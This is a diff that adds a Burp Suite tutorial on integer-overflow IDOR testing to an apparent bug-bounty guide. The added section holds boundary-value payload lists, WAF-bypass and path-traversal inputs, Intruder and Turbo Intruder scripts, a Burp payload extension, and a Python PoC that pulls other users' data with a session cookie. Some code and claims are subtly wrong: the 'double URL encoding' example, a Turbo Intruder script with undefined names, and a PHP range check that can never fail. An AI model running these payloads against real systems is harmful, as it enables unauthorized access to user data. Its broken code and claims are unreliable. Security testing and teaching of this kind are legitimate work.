@@ -17848,3 +17848,672 @@ You've successfully found Bug #31 if:
 
 ---
 
+# 📊 **Bug #32: Signed/Unsigned Integer Overflow IDOR - Complete Burp Suite Methodology**
+
+## 🎯 **Bug Description**
+**Bug #32** - Testing signed/unsigned integer overflow in ID parameters to access unauthorized resources by exploiting integer boundaries.
+
+---
+
+## 📚 **UNDERSTANDING THE VULNERABILITY**
+
+### **Integer Boundaries Reference**
+```
+8-bit signed:    -128 to 127
+8-bit unsigned:  0 to 255
+
+16-bit signed:   -32,768 to 32,767
+16-bit unsigned: 0 to 65,535
+
+32-bit signed:   -2,147,483,648 to 2,147,483,647
+32-bit unsigned: 0 to 4,294,967,295
+
+64-bit signed:   -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807
+64-bit unsigned: 0 to 18,446,744,073,709,551,615
+```
+
+### **Common Overflow Scenarios**
+```
+Normal ID: 100
+Try:       4294967295 (max 32-bit unsigned) → wraps to -1 or large number
+Try:       2147483647 (max 32-bit signed) → may overflow to negative
+Try:       -2147483648 (min 32-bit signed) → may wrap to positive
+```
+
+---
+
+## 🔍 **PHASE 1: RECONNAISSANCE & IDENTIFICATION**
+
+### **Step 1.1: Map All ID Parameters**
+1. **Browse the application normally**
+   - Navigate through all features
+   - Note every URL with numbers: `/user/123`, `?id=456`, etc.
+   - Document all API endpoints
+
+2. **Use Burp Spider/Discover Content**
+   ```
+   Target → Site Map → Right-click → Spider this host
+   Engagement Tools → Discover Content
+   ```
+
+3. **Check Burp Scanner results**
+   - Passive scan may highlight numeric parameters
+   - Look for "Interesting input" alerts
+
+### **Step 1.2: Identify Parameter Types**
+Create a spreadsheet/document with:
+
+| Endpoint | Parameter | Normal Value | Data Type | Auth Required |
+|----------|-----------|--------------|-----------|---------------|
+| /api/user/ | id | 1337 | Path | Yes |
+| /profile?uid= | uid | 500 | Query | Yes |
+| /download?file_id= | file_id | 1001 | Query | No |
+| /order/2024/ | order_id | 4500 | Path | Yes |
+
+### **Step 1.3: Capture Baseline Requests**
+1. **Proxy HTTP History**
+   ```
+   Proxy → HTTP History
+   Filter by parameter type (right-click → Filter by search term → "\d+")
+   ```
+
+2. **Save requests for testing**
+   - Right-click → Save item
+   - Create organized folders per endpoint
+
+---
+
+## 🧪 **PHASE 2: BURP SUITE CONFIGURATION**
+
+### **Step 2.1: Intruder Setup for Integer Overflow**
+
+1. **Send request to Intruder**
+   ```
+   Right-click on request → Send to Intruder
+   ```
+
+2. **Configure Positions**
+   ```
+   Positions tab → Clear §
+   Highlight the numeric value → Click "Add §"
+   Example: /api/user/§1337§
+   ```
+
+3. **Set Attack Type**
+   - Use "Sniper" for single parameter
+   - Use "Battering ram" if same value appears multiple times
+
+### **Step 2.2: Create Custom Payload List**
+
+1. **Go to Payloads tab → Payload type: "Simple list"**
+
+2. **Add boundary values (create this list):**
+
+```
+# Signed 32-bit boundaries
+-2147483648
+-2147483647
+-1
+0
+1
+2147483647
+2147483648
+
+# Unsigned 32-bit boundaries
+4294967295
+4294967294
+4294967296
+
+# Signed 16-bit boundaries
+-32768
+-32767
+32767
+32768
+
+# Unsigned 16-bit boundaries
+65535
+65536
+
+# Signed 8-bit boundaries
+-128
+-127
+127
+128
+
+# Unsigned 8-bit boundaries
+255
+256
+
+# Edge cases with operations
+2147483647 + 1
+4294967295 + 1
+-2147483648 - 1
+
+# String representations
+"2147483647"
+"4294967295"
+"0x7FFFFFFF"
+"0xFFFFFFFF"
+```
+
+### **Step 2.3: Advanced Payload Generation with Python**
+
+1. **Use Burp's "Extension-generated" payload type**
+2. **Create custom Python script:**
+
+```python
+def generate_payloads():
+    payloads = []
+    
+    # 32-bit boundaries
+    boundaries = [
+        -2147483648, -2147483647, -1, 0, 1,
+        2147483647, 2147483648, 4294967295
+    ]
+    
+    # Arithmetic operations
+    base = 100  # Original ID
+    operations = [
+        base + 2147483647,
+        base - 2147483648,
+        base * 1000000,
+        base + 4294967295
+    ]
+    
+    # Hexadecimal representation
+    hex_values = [
+        "0x7FFFFFFF",
+        "0xFFFFFFFF",
+        "0x80000000",
+        "0x00000000"
+    ]
+    
+    payloads.extend(boundaries)
+    payloads.extend(operations)
+    payloads.extend(hex_values)
+    
+    return payloads
+```
+
+---
+
+## ⚙️ **PHASE 3: ATTACK CONFIGURATION**
+
+### **Step 3.1: Payload Processing Rules**
+
+1. **URL Encoding**
+   ```
+   Payload processing → Add → Encode → URL-encode all characters
+   ```
+
+2. **Add prefix/suffix if needed**
+   ```
+   Add → Add prefix → "id="
+   Add → Add suffix → "&format=json"
+   ```
+
+### **Step 3.2: Resource Pool Configuration**
+
+1. **Create dedicated resource pool**
+   ```
+   Intruder → Resource pool → Create new pool
+   Maximum concurrent requests: 5-10 (to avoid rate limiting)
+   Delay between requests: 100-500ms
+   ```
+
+2. **Set throttle**
+   ```
+   Options → Request Engine → Throttle between requests
+   Fixed delay: 200 milliseconds
+   ```
+
+### **Step 3.3: Attack Options**
+
+1. **Configure Grep - Extract**
+   ```
+   Options → Grep - Extract → Add
+   Select response sections to monitor:
+   - User ID in response
+   - Email address
+   - Private data indicators
+   - Error messages
+   ```
+
+2. **Configure Grep - Match**
+   ```
+   Add common indicators:
+   "unauthorized"
+   "forbidden"
+   "access denied"
+   "error"
+   "exception"
+   "overflow"
+   "SQL"
+   ```
+
+---
+
+## 🚀 **PHASE 4: EXECUTING THE ATTACK**
+
+### **Step 4.1: Start Intruder Attack**
+
+1. **Click "Start attack"**
+2. **Monitor progress in real-time**
+3. **Watch for:**
+   - Different status codes
+   - Response length variations
+   - Time differences
+   - Extracted content
+
+### **Step 4.2: Analyze Results**
+
+**Sort and filter results:**
+
+1. **By Status Code**
+   ```
+   200 OK → Potential success
+   403 Forbidden → Access denied (expected)
+   500 Internal Error → Possible overflow triggered
+   302 Redirect → May indicate successful access
+   ```
+
+2. **By Response Length**
+   ```bash
+   # Look for:
+   - Lengths matching authenticated responses
+   - Unusually long responses (error details)
+   - Unusually short responses (crashes)
+   ```
+
+3. **By Response Time**
+   - Longer times may indicate processing issues
+   - Shorter times may indicate bypass
+
+### **Step 4.3: Manual Verification**
+
+For each promising result:
+
+1. **Send to Repeater**
+   ```
+   Right-click on interesting result → Send to Repeater
+   ```
+
+2. **Test in isolation**
+   ```
+   Repeater → Send multiple times
+   Modify request slightly
+   Test with original credentials vs different user
+   ```
+
+3. **Compare responses**
+   ```
+   Load original legitimate response
+   Load overflow attempt response
+   Compare side-by-side
+   ```
+
+---
+
+## 🎯 **PHASE 5: ADVANCED TESTING TECHNIQUES**
+
+### **Step 5.1: Burp Intruder with Pitchfork Attack**
+
+For testing multiple parameters simultaneously:
+
+1. **Set attack type to "Pitchfork"**
+2. **Add two payload positions:**
+   ```
+   /api/user/§id§?session=§token§
+   ```
+3. **Payload set 1: Overflow values**
+4. **Payload set 2: Different session tokens**
+
+### **Step 5.2: Cluster Bomb Attack**
+
+For comprehensive testing:
+
+1. **Set attack type to "Cluster bomb"**
+2. **Payload set 1: Integer boundaries**
+3. **Payload set 2: HTTP methods (GET, POST, PUT, DELETE)**
+4. **Payload set 3: Content-Type headers**
+
+### **Step 5.3: Bypass WAF/Filtering**
+
+If basic attempts are blocked:
+
+1. **Add junk data**
+   ```
+   /api/user/2147483647%00
+   /api/user/2147483647%20
+   /api/user/2147483647.jpg
+   ```
+
+2. **Use different encoding**
+   ```
+   # Double URL encode
+   /api/user/%3231347483647
+   
+   # Unicode encode
+   /api/user/\u0032\u0031...
+   ```
+
+3. **Add path traversal**
+   ```
+   /api/user/2147483647/../../admin
+   ```
+
+---
+
+## 📊 **PHASE 6: RESPONSE ANALYSIS DEEP DIVE**
+
+### **Step 6.1: Create Comparison Matrix**
+
+| Payload | Status | Length | Time | Contains Private Data | Error Message |
+|---------|--------|--------|------|----------------------|---------------|
+| 100 (normal) | 200 | 2450 | 120ms | Yes | None |
+| 2147483647 | 200 | 2450 | 118ms | Yes | None |
+| -2147483648 | 403 | 450 | 95ms | No | Access denied |
+| 4294967295 | 500 | 1200 | 350ms | No | Integer overflow |
+
+### **Step 6.2: Analyze Error Messages**
+
+Common overflow-related errors:
+
+```
+# Java
+java.lang.NumberFormatException
+java.lang.ArithmeticException: Integer overflow
+
+# PHP
+Integer overflow detected
+Floating point number cannot represent integer
+
+# Python
+OverflowError: integer overflow
+OverflowError: int too large to convert
+
+# .NET
+OverflowException: Arithmetic operation resulted in an overflow
+System.OverflowException
+```
+
+### **Step 6.3: Timing Analysis**
+
+1. **Use Burp Extender → Turbo Intruder**
+2. **Create timing script:**
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False)
+    
+    for payload in wordlists.boundaries:
+        engine.queue(target.req, payload)
+        
+    # Analyze timing results
+    for result in engine.get_results():
+        if result.time > avg_response_time * 2:
+            print(f"Anomaly detected: {result.time}ms for {result.payload}")
+```
+
+---
+
+## 🛠️ **PHASE 7: AUTOMATION WITH BURP EXTENSIONS**
+
+### **Step 7.1: Install Useful Extensions**
+
+1. **Turbo Intruder** - For high-speed attacks
+2. **Autorize** - For authorization testing
+3. **AuthMatrix** - For matrix-based testing
+4. **Logger++** - For detailed logging
+5. **JS Link Finder** - Find IDs in JavaScript
+
+### **Step 7.2: Create Custom Extension**
+
+```python
+from burp import IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator
+
+class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
+    
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Integer Overflow Payload Generator")
+        callbacks.registerIntruderPayloadGeneratorFactory(self)
+        
+    def createNewInstance(self, attack):
+        return IntegerOverflowGenerator()
+        
+class IntegerOverflowGenerator(IIntruderPayloadGenerator):
+    def __init__(self):
+        self._payloads = self.generate_payloads()
+        self._index = 0
+        
+    def generate_payloads(self):
+        return [
+            "-2147483648", "-2147483647", "2147483647", "2147483648",
+            "4294967295", "4294967296", "0x7FFFFFFF", "0xFFFFFFFF",
+            "-32768", "32767", "65535", "65536"
+        ]
+        
+    def hasMorePayloads(self):
+        return self._index < len(self._payloads)
+        
+    def getNextPayload(self, baseValue):
+        payload = self._payloads[self._index]
+        self._index += 1
+        return payload.encode()
+```
+
+---
+
+## 📝 **PHASE 8: DOCUMENTATION & REPORTING**
+
+### **Step 8.1: Document Findings**
+
+Create a detailed report:
+
+```
+VULNERABILITY DETAILS
+=====================
+Bug ID: #32 - Signed/Unsigned Integer Overflow IDOR
+Endpoint: /api/user/{id}
+Method: GET
+Authentication: Required
+
+PAYLOADS TESTED
+===============
+1. 2147483647 - Successfully accessed user 2147483647
+2. -2147483648 - Returned 500 Internal Error
+3. 4294967295 - Accessed user -1 (wrapped)
+
+EVIDENCE
+========
+- Screenshot 1: Normal request (user 1337)
+- Screenshot 2: Overflow request (user 2147483647)
+- Screenshot 3: Error message with overflow details
+
+IMPACT
+======
+- Unauthorized access to any user account
+- Potential system crash from integer overflow
+- Information disclosure of user data
+
+PROOF OF CONCEPT
+================
+1. Authenticate as low-privilege user
+2. Send GET request to /api/user/2147483647
+3. Receive full profile data of admin user
+```
+
+### **Step 8.2: Create Proof of Concept Script**
+
+```python
+#!/usr/bin/env python3
+import requests
+import sys
+
+def test_integer_overflow(target_url, session_cookie, original_id):
+    """
+    PoC for Integer Overflow IDOR
+    """
+    headers = {
+        'Cookie': f'session={session_cookie}',
+        'User-Agent': 'Mozilla/5.0'
+    }
+    
+    overflow_payloads = [
+        ('2147483647', 'Max 32-bit signed'),
+        ('4294967295', 'Max 32-bit unsigned'),
+        ('-2147483648', 'Min 32-bit signed'),
+        ('65535', 'Max 16-bit unsigned'),
+        ('0x7FFFFFFF', 'Hex representation')
+    ]
+    
+    for payload, description in overflow_payloads:
+        url = target_url.replace(str(original_id), payload)
+        
+        try:
+            response = requests.get(url, headers=headers, timeout=10)
+            
+            print(f"\n[+] Testing: {description}")
+            print(f"    Payload: {payload}")
+            print(f"    Status: {response.status_code}")
+            print(f"    Length: {len(response.text)}")
+            
+            if response.status_code == 200:
+                if "admin" in response.text.lower() or "private" in response.text.lower():
+                    print("    ⚠️  POTENTIAL IDOR DETECTED!")
+                    with open(f"idor_poc_{payload}.html", "w") as f:
+                        f.write(response.text)
+                        
+        except Exception as e:
+            print(f"    Error: {str(e)}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("Usage: python3 idor_overflow_poc.py <url> <session> <original_id>")
+        print("Example: python3 idor_overflow_poc.py 'https://example.com/api/user/1337' 'abc123' 1337")
+        sys.exit(1)
+        
+    test_integer_overflow(sys.argv[1], sys.argv[2], int(sys.argv[3]))
+```
+
+---
+
+## 🔒 **PHASE 9: VALIDATION & CONFIRMATION**
+
+### **Step 9.1: Manual Confirmation Checklist**
+
+- [ ] Can reproduce with different user accounts
+- [ ] Works across different sessions
+- [ ] Not a caching issue (clear cache and retry)
+- [ ] Works with different browsers
+- [ ] Consistent results over multiple attempts
+
+### **Step 9.2: Impact Assessment**
+
+Rate the vulnerability:
+```
+Critical: Can access ANY user data, including admin
+High: Can access some user data, no admin
+Medium: Can access limited data, requires specific conditions
+Low: Information disclosure only, no sensitive data
+```
+
+### **Step 9.3: Test for Exploitability Chain**
+
+Can this lead to:
+- Account takeover?
+- Privilege escalation?
+- Data breach?
+- System compromise?
+
+---
+
+## 🚨 **PHASE 10: RESPONSIBLE DISCLOSURE**
+
+### **Step 10.1: Prepare Disclosure Report**
+
+1. **Executive Summary**
+2. **Technical Details**
+3. **Proof of Concept**
+4. **Impact Analysis**
+5. **Remediation Recommendations**
+6. **Timeline of Discovery**
+
+### **Step 10.2: Remediation Suggestions**
+
+Include in your report:
+
+```php
+// Server-side fix example
+function validateUserId($input) {
+    // Validate integer range
+    if (!is_numeric($input)) {
+        throw new Exception("Invalid ID format");
+    }
+    
+    $id = (int)$input;
+    
+    // Check against valid range
+    if ($id < 1 || $id > PHP_INT_MAX) {
+        throw new Exception("ID out of valid range");
+    }
+    
+    // Authorization check
+    if (!userCanAccess($id, $_SESSION['user_id'])) {
+        throw new Exception("Access denied");
+    }
+    
+    return $id;
+}
+```
+
+---
+
+## 📊 **QUICK REFERENCE CHECKLIST**
+
+```
+[ ] Map all numeric parameters
+[ ] Collect baseline responses
+[ ] Configure Burp Intruder
+[ ] Generate overflow payloads
+[ ] Run initial scans
+[ ] Analyze results
+[ ] Manual verification
+[ ] Document findings
+[ ] Create PoC
+[ ] Report responsibly
+```
+
+---
+
+## 🛠️ **BURP SUITE SHORTCUTS FOR THIS BUG**
+
+```
+Ctrl+R - Send to Repeater
+Ctrl+I - Send to Intruder
+Ctrl+Shift+B - Send to Comparer
+Ctrl+F - Search in response
+Ctrl+Shift+F - Filter by search term
+Alt+1/2/3 - Switch between tabs
+Ctrl+Tab - Cycle through tabs
+```
+
+---
+
+## ⚠️ **IMPORTANT REMINDERS**
+
+- Always test in authorized environments
+- Don't exceed rate limits
+- Stop if you encounter system instability
+- Document everything
+- Verify findings manually
+- Consider legal implications
+- Follow responsible disclosure
+
+---
+
